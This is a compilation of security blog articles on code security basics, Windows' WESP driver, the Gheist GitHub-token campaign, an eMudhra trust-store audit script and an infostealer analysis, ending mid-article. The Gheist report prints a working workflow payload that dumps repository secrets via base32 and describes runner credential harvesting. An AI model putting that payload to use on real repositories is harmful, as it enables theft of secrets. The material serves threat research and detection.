Title: Code security for new coders
Context: There are also many security tools available, but it can be confusing to know what type of tool to use and when
Full Text:
Coding agents enable anyone to turn their ideas into reality. However, building with security in mind is imperative to keep your application secure. There’s a lot of reference information about application security out there, but it often is jargon-heavy and targets developers or security professionals, not vibe coders. There are also many security tools available, but it can be confusing to know what type of tool to use and when. This post breaks down essential security terms and tools so that you can build safely from the start.

If you aren’t sold on the importance of application security or think it only matters to large companies, consider the PHP2Shell vulnerabilities disclosed in October 2026. These two vulnerabilities affect PHP, a programming language used by more than 70% of websites. They could allow an attacker to take control of a website’s server. The vulnerabilities are so serious that some organizations temporarily took services offline while installing security updates.

What is code security?

In simple terms, code security is the practice of writing secure code. Because application security starts with code security, taking a proactive approach early prevents major vulnerabilities later.

There are two main things we need to be concerned with when thinking about code security: the code you (or your agent) is writing (i.e., first-party code), and the code that is written by someone else but being used by your application (i.e., third-party code). With first party code, you are directly responsible for fixing the problem. Third-party code is treated differently because you are not the one who can fix the code, but you are responsible for using a version that does not have vulnerabilities. We often refer to third-party code as being part of the software supply chain, but more on that later.

What is first-party code?

First-party code is the code that you are producing and are thus responsible for. While being responsible for maintaining secure code might seem intimidating, you can most likely fix security issues by prompting the agent to fix them. There are automated security scans you can run to discover vulnerabilities, or you can simply ask the agent to do a security check. Checking for OWASP top ten vulnerabilities is always a good place to start.

What are secrets?

One of the simplest, yet most impactful ways to improve security is to avoid hardcoding secrets. This means that you should never write in the code any password, token, key, or any secret or credential that can be used to gain access to your resources. Instead, you can use environment variables that act as a placeholder that point to a specific hidden configuration file or a secret manager.

What is the software supply chain?

The software supply chain refers to everything that is used to develop and run an application, including dependencies, tools, and infrastructure. There are also open source code components used in the software supply chain, such as GitHub actions and Docker images, which can help you deploy and run your code. Of all these elements, third-party dependencies are usually the main focus in discussions about code security.

Now you might be thinking, why do I need to use third-party code? Technically you don’t, but it makes writing code much easier, whether it’s done by you or an agent. By relying on these open-source dependencies, you are using code that was already written by someone else and that is shared with the community to solve a problem. What’s important to understand in the context of AI-generated code is that coding agents use dependencies by default, often relying heavily on outdated versions.

Dependencies rely on other dependencies, so the risk starts to grow as you start to use them. There are two things in particular you need to be concerned about with third-party dependencies: vulnerabilities and malicious packages. Vulnerabilities in third-party dependencies are accidental code issues that usually require upgrading to the latest version once the issue is fixed. Malicious packages represent a more intentional threat and are becoming more common. With these packages, someone has purposefully added a malicious script in the version and released it for personal gain.

Overall, the concern with using third-party code is that dependencies can quickly accumulate vulnerabilities if the maintainer doesn’t have the time to address these security flaws.

Security questions to ask your coding agent

The cool thing about vibe coding is that you can ask the agent any questions you may have. The difficulty can be knowing exactly what to ask. Below is a list of good places to start, but it is not exhaustive.

Setup questions

These are the types of questions that should be asked before any code is written. The goal is to have some security requirements planned out so an agent has a path to follow.

What sensitive data will this app handle (passwords, payment info, personal data, API keys), and how should each type be protected?

What authentication and authorization approach fits this app, and what are the tradeoffs?

Follow-up questions

After the code is written, you should make sure the agent made the best decisions for security. Ask questions that make the agent explain why certain security decisions were made. This will force the agent to go back through the code, which might lead it to suggest a change.

Can you do a security review on the application? Are there any concerns?

Do any OWASP top 10 vulnerabilities exist in this code?

What security tradeoffs did you make to keep this simple, and what would you fix before real users touch this?

If you were a penetration tester, what's the first thing you'd try to break in this app?

What third-party packages did you use? Are any of them outdated? Do any have known vulnerabilities?

Does any of this code contain hardcoded API keys, passwords, or tokens? If so, where, and how do I move them to environment variables or to a secrets manager?

Are default credentials or debug modes left enabled anywhere?

Is there a .env or config file here, and is it excluded from version control (.gitignore)?

Are there any insecure coding patterns or logic flaws present?

Is there anything concerning about the current authentication and access controls configuration?

Are cloud storage buckets, databases, or admin panels publicly accessible when they shouldn't be?

If this is deployed, what's exposed to the internet that doesn't need to be?

What are the different types of code security tools?

Security tools come in all shapes and sizes. While many tools are paid, there are also open source tools that function similarly. The list below includes the most common types of tools.

Software Composition Analysis (SCA)

Tools of this type scan all the open-source dependencies that are being used in the application and alert you if there are any vulnerabilities. Most providers will also tell you what version you can upgrade to in order to eliminate that vulnerability.

Static Application Security Testing (SAST)

This type of tool is focused on looking at your first-party code for vulnerabilities. Most commonly, these tools scan the written code without running that code. They are good for early detection while you are actively coding but can provide more false positives than other tools do.

Interactive Application Security Testing (IAST)

Tools in this category look at how data is flowing into a running application to find code vulnerabilities. Since they require a running application, they are generally used later in the software delivery life cycle compared to SAST tools. However, they also tend to be more accurate.

Dynamic Application Security Testing (DAST)

Tools that perform this type of security scan run pre-configured automated tests against a running application. They are not interchangeable with SAST or IAST tools.

Infrastructure as Code (IaC) Scanning

Tools that use this type of scanning are focused on looking at any IaC files for risky settings and misconfigurations.

Secret Scanning

Secret scanners search your codebase for hardcoded credentials, API keys, and passwords.

How Datadog can help

Security scans are a great way to understand what is happening in your code. Datadog Code Security has many types of tools you can use to gain visibility into your application, including SCA, SAST, IAST, IaC, and Secret scanning tools.

Datadog also has two open source tools that can be used for supply chain security: GuardDog to flag malicious packages and Supply Chain Firewall to block malicious packages from being installed.

Conclusion

The good news is that you do not need to become a security expert before bringing an idea to life. Start with a few basics: keep secrets out of your code, scan both first-party and third-party code, update your dependencies, and ask your coding agent to check for common vulnerabilities.

The goal is not to build a perfectly secure application on your first try. It is to understand what your application uses, recognize the risks, and make security part of how you build from the start. Addressing issues along the way is much easier than responding after your application or its users have been put at risk.

Title: Kernel eviction notice: What wesp.sys reveals about the Windows Endpoint Security Platform
Context: Any features or functionality not currently available may not be delivered on time or at all
Full Text:
Microsoft is building a way for EDR products to run outside the Windows kernel. It is called the Windows Endpoint Security Platform, and two of its binaries already ship in Windows Insider build. One is the kernel driver wesp.sys, the other the user-mode API espclient.dll. Microsoft wants one kernel driver it maintains itself, in place of the one every security vendor currently ships, after the July 2024 CrowdStrike update crashed 8.5 million machines. WESP is undocumented, but the binaries carry public symbols, so a kernel debugging session gets you a fair way in. wesp.sys is a file system mini-filter at altitude 329500, talking to user mode over a filter communication port.

Kernel mode vs user mode: How EDR works today

Are you tired of the Windows Blue Screen of Death? Well, Microsoft decided to take significant action to remove security products from running within the Windows kernel, as kernel components are the ones that can cause Windows to Blue Screen, which can have a significant impact, as was demonstrated a couple of years ago with a bug in a third-party kernel component.

Typical Endpoint Detection and Response (EDR) software consists of two main components: a kernel-mode driver and a user-mode service, communicating in some way, as the following image shows:

The process boxes represent normal user applications running on a system, like Word, Explorer, or Paint. The Service and Kernel Driver are installed by the EDR product.

The kernel driver’s main purpose is to register for various kernel notifications, such as process creation and file writes. Any notification of interest is typically forwarded to the user-mode service where more processing can be done:

Forward the notification data to a server for further analysis and aggregation.

Consult a set of rules that may lead to blocking the operation entirely.

Alert the human user of the operation, perhaps requiring an interactive decision.

This is all well and good, if everything works as planned. Unfortunately, kernel drivers cannot perform illegal operations, such as dereferencing a bad pointer. In that case, the system crashes with the infamous “Blue Screen of Death” (BSOD), and restarting the machine is the only way back in, assuming the offending driver doesn't crash when it loads early at boot.

Why the CrowdStrike outage changed Microsoft’s mind

That is exactly what happened on July 19, 2024, when a bad configuration file update caused CrowdStrike’s EDR kernel driver to crash on millions of machines worldwide. The risk of kernel drivers crashing systems has existed in Windows since its inception, but this incident was particularly nasty because it rendered so many machines unusable, taking airports, banks, and other critical facilities offline for hours.

Microsoft took this to heart; after all, it's Windows. They launched a new initiative to move EDR products out of the kernel so similar incidents can’t happen. This is non-trivial, however, for a few reasons:

The Windows kernel will now have to deliver notifications that EDR kernel drivers expect to the EDR’s user-mode service. This has to be efficient to be usable.

Existing products will take time to migrate, even if Microsoft provides a full solution, so we must support the existing behavior.

Any such framework must be flexible enough, and complete enough, to be adopted successfully. If features EDR products require are missing, adoption and migration will be partial at best.

What is the Windows Endpoint Security Platform (WESP)?

The Windows Endpoint Security Platform is Microsoft’s framework for moving EDR products to user space. The project is in its early stages, as shown in Windows Insider builds that include the new platform’s binaries. The main component is a kernel driver, wesp.sys, built by Microsoft, and a user-mode API implemented in espclient.dll that EDR’s user-mode service would use to connect and receive notifications of interest.

It may seem ironic that the implementation centers on a kernel driver (wesp.sys), but there is no way around it; at the end of the day, the kernel must provide the notifications the EDR service expects. So, wesp.sys will play the role of an EDR kernel driver, but since Microsoft implements it, there will be only one driver to test and debug properly, rather than the current state where every EDR platform has its own in-house kernel driver.

What EDR vendors need from WESP

At the time of writing, the WESP platform is not publicly documented. There are some expectations, however, that the platform must provide if EDR systems are to adopt it:

It should be comprehensive. EDRs today register for notifications in several different ways, each with its own mechanism:

Event type

Current registration mechanism

Process, thread, image, handle

Registration functions with a callback

Registry

Registration functions with a callback

File system

File system mini-filter

Network

WFP callout driver

All these variations add to the complexity of EDR drivers. WESP should provide all of these; otherwise, EDR drivers will continue to exist, albeit with less code for what WESP covers. It’s reasonable to assume that not everything will be provided on day one, but I expect everything to be provided eventually.

Some notifications a kernel driver can register for are very “noisy”. For example, Registry and file read operations are happening all the time in large quantities. You can get a sense of that by running Process Monitor (ProcMon) from Sysinternals and watching the hundreds of events (or more) displayed every second related to the Registry and the file system (especially read operations). Passing all such events to user mode is not feasible; it would be too slow, or at least inefficient. This means WESP will have to provide some filtering capability, so that events that are not interesting can be dropped “at the source” (the WESP driver), rather than being sent to user mode and dropped there. Flexibility in these rules is paramount, as it can significantly lower the load on the user-mode service.

A power that only certain kernel notifications have is blocking an operation, something that cannot be done in user mode. The classic example is creating a process – a kernel driver can register for such events with PsSetCreateProcessNotifyRoutineEx – a documented function all EDRs use. The callback is invoked while process creation is in progress, allowing it to set a failure status for the process creation if it so desires (for example, by inspecting the new process command line and deciding it’s malicious). Such power does not exist in user mode – you can get notified when a process is created, but you cannot veto creation. WESP clients (user mode) must be given this power so they can block process creation under certain conditions. These conditions should be flexible enough to be configured in most cases. Ideally, it should let the user-mode service run custom code before replying to the driver with whether to allow or block process creation.

Client processes that work with ESP must run elevated to access the platform. They will likely need to run as Protected Processes Light (PPL), signed by Microsoft, which is how EDR services run today, at least with most vendors, since it’s not currently required.

Inside wesp.sys: What the binaries reveal

Though not documented yet, we can get some WESP details by examining the binaries provided. As a nice bonus, the symbols for these binaries are provided by the Microsoft public symbol server.

Running a local kernel debugging session on a VM with WESP installed can give us some insights into how WESP works. First, the WESP driver file is wesp.sys located in the System32\Drivers directory, where most drivers live. We can examine the Registry where drivers are installed to find the key name, which is also the driver kernel object name:

Clearly, the driver’s name is simply wesp. With that detail in hand, we can look in WinDbg for the major functions supported by the driver (some formatting done for better readability):

lkd> !drvobj wesp f Driver object (ffffc0e9fe2e6310) is for: \FileSystem\wesp Driver Extension List: (id , addr) Device Object list: Flags: 0x00000012 0x00000002 DRVO_LEGACY_DRIVER 0x00000010 DRVO_INITIALIZED DriverEntry: fffff80564281000 wesp!DriverEntry DriverStartIo: 00000000 DriverUnload: 00000000 AddDevice: 00000000 Dispatch routines: [00] IRP_MJ_CREATE fffff805d07a14d0 nt!IopInvalidDeviceRequest [01] IRP_MJ_CREATE_NAMED_PIPE fffff805d07a14d0 nt!IopInvalidDeviceRequest [02] IRP_MJ_CLOSE fffff805d07a14d0 nt!IopInvalidDeviceRequest [03] IRP_MJ_READ fffff805d07a14d0 nt!IopInvalidDeviceRequest [04] IRP_MJ_WRITE fffff805d07a14d0 nt!IopInvalidDeviceRequest [05] IRP_MJ_QUERY_INFORMATION fffff805d07a14d0 nt!IopInvalidDeviceRequest [06] IRP_MJ_SET_INFORMATION fffff805d07a14d0 nt!IopInvalidDeviceRequest [07] IRP_MJ_QUERY_EA fffff805d07a14d0 nt!IopInvalidDeviceRequest [08] IRP_MJ_SET_EA fffff805d07a14d0 nt!IopInvalidDeviceRequest … [0e] IRP_MJ_DEVICE_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [0f] IRP_MJ_INTERNAL_DEVICE_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [10] IRP_MJ_SHUTDOWN fffff805d07a14d0 nt!IopInvalidDeviceRequest [11] IRP_MJ_LOCK_CONTROL fffff805d07a14d0 nt!IopInvalidDeviceRequest [12] IRP_MJ_CLEANUP fffff805d07a14d0 nt!IopInvalidDeviceRequest [13] IRP_MJ_CREATE_MAILSLOT fffff805d07a14d0 nt!IopInvalidDeviceRequest [14] IRP_MJ_QUERY_SECURITY fffff805d07a14d0 nt!IopInvalidDeviceRequest [15] IRP_MJ_SET_SECURITY fffff805d07a14d0 nt!IopInvalidDeviceRequest … [1b] IRP_MJ_PNP fffff805d07a14d0 nt!IopInvalidDeviceRequest Device Object stacks: Processed 0 device objects.

From the output, we can see there are no driver-provided major function code handlers (I omitted a few for brevity, but they all point to the kernel-provided handler, IopInvalidDeviceRequest); in fact, no device objects exist at all. This means talking to this driver cannot be done with a classic DeviceIoControl, where a device is opened by name with CreateFile (really a symbolic link) or NtOpenFile (actual device name); there is no device to open. We see the driver object is stored in the \FileSystem object manager directory, where file-system mini-filters are typically stored. Another clue leading to the same conclusion is the Registry showing the “Type” value as 2, which represents a file system-related driver.

We expect the WESP driver to register for the various notifications a “standard” EDR driver would. We can see that when opening wesp.sys in some PE viewer (screenshot is from one of my tools, Total PE):

It also depends on FltMgr.Sys, which is the Filter Manager driver, managing file system mini-filters, proving that wesp.sys is a file system mini-filter. Another tool you can run to reinforce this conclusion is the built-in fltmc command-line tool in an elevated command window:

Filter Name Num Instances Altitude Frame ------------------------------ ------------- ------------ ----- bindflt 1 409800 0 UCPD 5 385250.5 0 wesp 7 329500 0 WdFilter 5 328010 0 storqosflt 0 244000 0 wcifs 0 189900 0 PrjFlt 0 189800 0 CldFlt 1 180451 0 FileCrypt 0 141100 0 luafv 1 135000 0 UnionFS 0 130850 0 bfs 7 100010 0 npsvctrig 1 46000 0 Wof 3 40700 0 FileInfo 5 40500 0 WinSetupMon 1 40300 0

WESP is in the list, showing its altitude (higher altitude drivers get notifications before lower altitude drivers).

How wesp.sys talks to user mode

How is the driver communicating with user mode if it has no device objects, taking DeviceIoControl off the table? File system mini-filters have a mechanism available to them, which is using FilterCommunicationPort kernel objects. These provide bidirectional communication with user mode clients, which is more flexible than DeviceIoControl-style communication, which is unidirectional in nature (user to kernel). We can also see this in the imports called from FltMgr.sys, like FltCreateCommunicationPort, the fundamental API for creating such an object. You can also see a port named ESPFilterPort under the root object manager directory (shown in WinObj from Sysinternals):

Can a user-mode client block process creation?

What about the user mode client? We can open espclient.dll (located in the System32 directory) in Total PE to get some hints:

As you can see, the DLL exports lots of functions, all starting with Esp. We can identify rules and filters, confirming the assumption that these are necessary, so events can be filtered at the source, i.e., not sent to user mode if there is no interest. The API is C-based (not COM) – at least as it’s exposed to consumers. The client DLL’s imports include FltLib.Dll, which is the client DLL for using filter communication port objects. The three functions being used by EspClient.Dll are FilterConnectCommunicationPort (open a handle to a FilterCommunicationPort object), FilterGetMessage, and FilterSendMessage. A missing function (in my mind) is FilterReplyMessage, which allows a direct reply to a message from the driver. This missing function implies that user mode has no “response” capability, and that communication is one-way. This means that running custom code in user mode and then “replying” to the driver with a “decision” (such as blocking a process from being created) is probably not implemented, at least not yet.

Conclusion: What WESP means for EDR vendors

WESP is Microsoft’s attempt to reduce third-party kernel code that Microsoft can't fully control. It aims to increase Windows reliability by reducing the chances of BSODs or other nastiness that could result from kernel driver code. The hope is that, by leveraging WESP, we can reduce the need for third-party kernel code and potentially remove it entirely. WESP isn't broadly available or well documented yet, but EDR providers are preparing to use it. Elastic is among them: Elastic Defend, Elastic’s XDR solution, is preparing to support WESP.

Title: Gheist: Attempted Scaled Abuse of Stolen GitHub Tokens Stumbles
Context: As of October 24: the attack is ongoing and evolving roughly ⅔ of implicated accounts are no longer available on GitHub
Full Text:
Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named sync-check to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent gheist, which gives the campaign its name.

We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories.

A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments.

As of October 24:

the attack is ongoing and evolving

roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.

How the attack works

For each repository, the tool creates a branch named ci-sync- plus six random characters, then commits .github/workflows/sync-check.yml with the message ci: sync config. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:

name: sync-check on: [push] permissions: {} jobs: sync: runs-on: ubuntu-latest timeout-minutes: 6 steps: - name: build run: | env | base32 -w 120 echo -n '${{ toJSON(secrets) }}' | base32 -w 120

Three details make it work:

GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.

While permissions: {} restricts the job's GITHUB_TOKEN, which the attacker doesn't need, it doesn't restrict the secrets context.

When a repository has deployment environments, the tool lists them in a job matrix with environment: ${{ matrix.environment }}, so environment-scoped secrets, often production credentials, are printed too.

Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block.

In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.

How the payload evolved

Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.

Tool A uses a hexadecimal suffix and the plain payload.

Tool B uses a base36 suffix, added timeout-minutes: 6 and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.

On October 19, Tool B added echo X | base32 -w 120 between the dumps, which prints LAFA==== as a separator, likely for the operator's log parser. Hours later it pushed a second job, sync-host, with runs-on: self-hosted, apparently only to repositories with a registered self-hosted runner. It writes three helper files (.gdmp_pat, .gdmp_patg, .gdmp_sweep) and logs each stage under a ===== gdmp-pivot: <stage> ===== header:

Host details and crontab.

A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, .env files, Terraform state and shell history.

The environment of every process, from /proc/*/environ.

Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.

AWS instance-role credentials, plus GCP and Azure metadata.

GitHub Actions and GitLab runner credential files.

The Kubernetes service account token.

However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.

GitHub's approval hold and private repositories

Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. The control worked, and the malicious payloads never ran.

Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on ci-sync-* branches completing and then being deleted by the gheist user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.

For defenders, that last signal finds Gheist without any GitHub logs, as shown below.

Other activity on the same accounts

This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:

Lure repositories (malware distribution). On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 ci-sync branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.

Free compute. On October 18, 25 Gheist accounts each created a "Windows RDP Runner" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.

PolinRider. Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to vite.config.js behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.

Megalodon. 57 accounts from Gheist's first phase were also victims of Megalodon in May.

The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.

Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.

Which actions should security teams take?

Hunt

Look for branches named ci-sync- followed by six random characters, where the only change is a new file at .github/workflows/sync-check.yml with the commit message ci: sync config.

In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of completing, and for any activity from the user agent gheist.

If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.

On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.

Respond

Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.

Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.

If a ci-sync branch ran on a self-hosted runner, treat the host and its instance role as compromised.

Don't approve held sync-check runs, and don't run code from ci-sync branches.

Harden. Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.

Indicators of compromise

User agent gheist

Branch ci-sync- followed by six characters, matching ^ci-sync-[0-9a-z]{6}$

Commit message ci: sync config adding only .github/workflows/sync-check.yml

Markers toJSON(secrets) }}' | base32 -w 120 and ===== gdmp-pivot:; files .gdmp_pat, .gdmp_patg, .gdmp_sweep

Workflow blob SHAs: f3da2b8b357dcda02fd455d314be2a95007516a6 (plain), d09535857a741bbb976bdc084a9a021713133291 (timeout), 1dc5af9cce950aad1eb1546ecce8565b117540c4 (separator), c665b778b2d822453293003e7ca0bbb2cb08e39d (self-hosted job). Environment-matrix variants differ per repository.

How can Wiz help?

The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including "New Workflow Completed And Deleted In Short Time Span", "Workflow Pushed With Secret Dump" and "Commit Created With Known Malicious Commit Message".

Black Lotus Labs identified a China-nexus cyber infrastructure provider, dubbed a “quartermaster,” that supplies reconnaissance, proxy routing, and obfuscation services to Chinese cyber espionage actors.

Title: eMudhra Incident: A Practical Audit to Inspect Tools
Context: Browser protections were an important first response to the eMudhra certificate authority incident
Full Text:
Browser protections were an important first response to the eMudhra certificate authority incident. But they don't answer a harder question for organizations: which other tools and environments still trust the affected certificate chains?

Certificate trust can come from different places. A tool may use the operating system's trust store, a bundled certificate list, or a runtime-specific store such as a Java JDK's cacerts. One machine can therefore have different trust behavior across its browsers, developer tools, and runtimes. Updating one trust store doesn't update them all.

That makes eMudhra remediation a software supply chain problem. Teams need to find where trust is configured, identify which systems need attention, and confirm that updates reach the tools developers and build processes actually use.

Start by Finding What Each Tool Trusts

Paul Horton, Sonatype's Open Source Program Office (OSPO) Global Director, created the open source eMudhra Audit and Fix script to help teams inspect selected developer tools on Unix-like machines.

The script checks tools such as Java, Node.js, Python, Go, and Git, along with system certificate bundles and other components. Where supported, it makes live HTTPS requests to two test hosts whose certificates chain to the affected intermediates, then checks GitHub as a control. The control helps distinguish certificate rejection from other connection problems, such as a lack of network access. The script also compares some tool versions with fixes listed in the incident reference. When a live probe and version check disagree, the live probe takes precedence.

By default, the audit does not install, change, or delete anything on the machine. It creates temporary probe programs and makes ordinary HTTPS requests. Those requests send no file contents. If network probes aren't appropriate for an environment, the --no-network option skips them and runs version checks only.

Teams can use the results to identify tools that need attention and decide what to investigate next. An audit result is a starting point for remediation, not confirmation that every system in the organization is protected.

Use the Results to Guide Remediation

Teams can use the script's output to:

Identify affected or potentially affected tools on a workstation.

Confirm how each tool is installed and which trust store it uses.

Apply the relevant operating system, runtime, or application vendor update.

Re-run the checks and record which systems still need remediation.

The script also has an optional --fix mode that can apply some changes it supports, asking before each change. Those actions can include upgrading a supported tool or changing a system or runtime trust store. Review the README and the proposed action before proceeding; the --dry-run option shows what a fix would do without changing anything. Prefer vendor updates where available, and test any workaround against the systems and services that depend on the trust store.

Know What the Script Can't See

The script audits the machine where it runs. It does not scan remote hosts, containers, or per-project dependencies. Its coverage is limited to specified tools and installation paths. Some tools receive version checks rather than live probes. A result from a developer workstation therefore cannot establish the status of a CI runner, container image, production host, or another employee's machine.

Organizations should treat those environments as separate parts of the investigation. Update and verify container images, build agents, and managed systems through the processes and vendor guidance that apply to them. For Sonatype products, follow the current Help documentation for product-specific updates and instructions.

The eMudhra incident showed why browser status alone can't answer whether an organization is remediated. Trust stores are distributed across tools and environments, and each one needs an owner and a way to verify its status. Paul's script gives teams a practical way to examine part of that landscape. Completing the work still requires a broader inventory, vendor updates, and follow-up checks.

The script is part of the Sonatype Nexus Community. If you have feedback or would like to contribute, engage with the project by following its Contribution Guidelines. As a community project, it is not officially supported by Sonatype.

For background on the eMudhra incident and Sonatype's response, see our published blog post.

Context: This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the...
Full Text:
Key Points

Aokigahara, a newly observed infostealer, has been spotted in the wild. An earlier version may have been known as Kamidere or Stygian. The malware includes traditional data theft capabilities targeting browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications, among other targets.

AI applications and development tools are notable targets. The stealer collects authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools.

Stolen AI credentials could offer opportunities for monetization. Usable credentials or session tokens could enable unauthorized access to paid AI services or the resale of compromised accounts.

Its collection scope extends to developer and cloud environments. Targets include Git credential files, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files.

Introduction

Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments.

This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the environments developers use to build software. Valid credentials or session tokens could expose private conversations and development data, enable unauthorized use of paid services, or potentially be sold to provide access to compromised AI accounts. While the malware’s collection routines support these possibilities, the analysis does not confirm how its operators monetize the stolen data.

Stealer Capabilities and Targeted Applications

The Aokigahara infostealer includes common information-stealing capabilities, such as screenshot capture, clipboard collection, browser credential and cookie theft, cryptocurrency wallet data collection, and file grabbing. It also includes a clipper handler that drops a separate component for clipboard manipulation.

The malware targets Chromium-based browsers and Mozilla Firefox, desktop cryptocurrency wallets and browser wallet extensions, messaging applications such as Discord and Telegram, and gaming platforms such as Steam, Roblox, and Minecraft. Additional targets include password managers, VPN clients, FTP/SFTP clients, email applications, and AI development tools. The table below summarizes each handler, its targets, and any limitations identified during the analysis.

The table below lists the malware’s main capabilities and their corresponding internal function names.

Chromium-based browser profiles. The embedded paths name Chrome (including Beta/Canary), Edge (including Beta/Dev/Canary), Brave, Opera, Vivaldi, Yandex, 360Chrome, CentBrowser, CocCoc, Comodo Dragon, Epic Privacy Browser, Iridium, Torch, Slimjet, URBrowser, SRWare Iron, Chromium, 7Star, Amigo, Sputnik, Atom, Orbitum, QQBrowser, Naver Whale, Maxthon, Avast, AVG, CCleaner Browser, and Kinza. AI/developer-tool credentials and sessions: Claude Code/Desktop, Codex, ChatGPT Desktop, AWS credentials/SSO and Amazon Q, Cursor, Windsurf, Kiro, GitHub Copilot/VS Code, Gemini CLI, and JetBrains AI Assistant. It also queries Windows Credential Manager.

Drops a clipper component beneath C:\Microsoft\Vault using embedded data. The handler itself does not access the clipboard; it deploys the component responsible for clipboard manipulation. The targeted cryptocurrency wallets or address formats have not been confirmed.

The ide handler collects local data from code editors and developer tools, including VS Code, Cursor, Windsurf, and JetBrains products. Notable targets include Git credential files, files under .ssh that may contain private keys, AWS/Azure/Google Cloud credential and configuration files, and GitHub Copilot storage. It passes matching file contents to the malware’s upload routine. If usable secrets are exposed, attackers could gain access to source code repositories, cloud resources, and other development services.

AI Data Theft

The more distinctive capability is the aisessions handler, which targets AI applications and development tools. These include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, and Gemini CLI, alongside AWS credentials and single sign-on (SSO) data. This extends the malware’s collection beyond traditional personal accounts to authentication files, session data, and configuration files associated with AI-assisted development and cloud environments.

The paths below identify the handler’s collection targets. Depending on the application, these files may contain tokens, credentials, session data, or settings; not every targeted file necessarily contains authentication secrets.

Attackers target these files because they may contain authentication tokens, API keys, cloud credentials, and session data. If valid and usable, these secrets can allow attackers to access AI services or cloud environments without entering a password, potentially exposing private conversations, source code, and other sensitive information. Compromised accounts may also be used to consume paid services, generate unauthorized charges, or support further attacks.

Anti-Analysis

The infostealer includes several known anti-analysis checks, most of which run only when their corresponding configuration flags are enabled. The results of these checks determine whether the malware continues execution. It also dynamically resolves Windows API functions using hashes and uses control-flow flattening in some parts of the code, particularly around the configuration decryption routine.

When the language-check flag is enabled, the malware checks the system’s keyboard layout and Windows UI language. If either matches a language ID represented in the bitmask 0x6C0400C8601, the malware stops execution. The excluded language settings are listed below.

The second configuration flag enables analysis-environment checks, including anti-debugging, virtual machine detection, and sandbox detection. The anti-debugging checks include:

Inspection of debugger-related flags in the Process Environment Block (PEB).

Queries for the process debug port and debug object.

A debug-output string check.

Inspection of hardware breakpoint registers (DR0–DR3).

The malware checks for indicators of virtualized or analysis environments, including:

Hypervisor identifiers obtained through the CPUID instruction.

Registry entries and running processes associated with virtual machine guest tools.

Firmware and System Management BIOS (SMBIOS) fingerprints.

A low number of running processes.

Suspicious usernames and computer names.

Display characteristics and available hardware resources.

The malware also checks usernames and computer names against strings commonly associated with test or analysis environments. The inspected strings include:

"sandbox", "malware", "virus", "sample", "test", "user", "admin", "CurrentUser", "John", "Peter", "JOHN", "John Doe", "WDAGUtilityAccount"

Additional checks monitor cursor movement and the number of running processes. These signals may help the malware identify automated analysis environments.

Configuration

